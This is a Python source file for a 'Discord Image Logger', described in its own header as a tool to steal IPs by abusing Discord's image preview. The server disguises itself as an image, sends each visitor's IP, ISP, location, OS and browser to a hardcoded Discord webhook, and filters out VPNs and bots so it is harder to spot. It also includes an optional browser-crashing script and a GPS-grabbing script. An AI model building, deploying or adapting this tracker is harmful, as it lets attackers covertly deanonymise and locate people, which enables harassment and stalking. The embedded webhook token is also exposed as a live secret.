# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A ~Simple~ Advanced application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt/HackersHaven"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1408613892086698056/e0sFF3R3ODH6EeW92KgYD7iVlIhTQ1XldXmse-zTeU4RyG074lxzB9ohf9oV1kNX4RRX",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
